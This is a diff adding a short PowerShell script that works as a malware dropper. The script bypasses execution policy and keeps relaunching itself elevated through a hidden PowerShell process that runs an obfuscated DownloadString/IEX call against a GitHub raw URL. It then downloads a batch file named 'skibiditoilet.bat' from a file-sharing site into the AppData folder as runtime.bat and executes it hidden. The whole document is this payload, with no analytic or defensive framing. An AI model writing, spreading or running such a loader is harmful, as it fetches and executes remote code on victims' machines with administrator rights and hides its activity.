@@ -1,1 +1,16 @@
+Set-ExecutionPolicy Bypass -Scope Process -Force
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    while(1) {
+        try {
+            $code = ("https://raw.githubusercontent.com/bensgaming-dot/bensgaming-dot.github.io/refs/heads/main/code/download")
+            $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$code')"
+            Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru -Verb RunAs
+            exit;
+        } catch {}
+    }
+}
 
+$url = "https://anonsharing.com/file/db59849be6b5f562/skibiditoilet.bat"
+$outputPath = "$env:appdata\runtime.bat"
+Invoke-WebRequest -Uri $url -OutFile $outputPath
+Start-Process -FilePath $outputPath -WindowStyle Hidden
